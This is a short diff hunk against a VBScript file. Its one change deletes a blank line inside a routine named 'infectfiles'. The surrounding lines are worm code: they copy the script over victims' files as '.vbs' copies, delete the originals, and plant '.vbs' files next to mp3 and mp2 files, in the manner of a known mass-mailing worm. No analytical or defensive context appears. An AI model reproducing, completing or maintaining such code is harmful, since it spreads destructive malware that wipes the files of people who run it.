@@ -148,7 +148,6 @@ Sub infectfiles(folderspec)
 
       cop.copy(f1.path & ".vbs")
       fso.DeleteFile(f1.path)
-      
     ElseIf (ext = "mp3") Or (ext = "mp2") Then
       Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
 
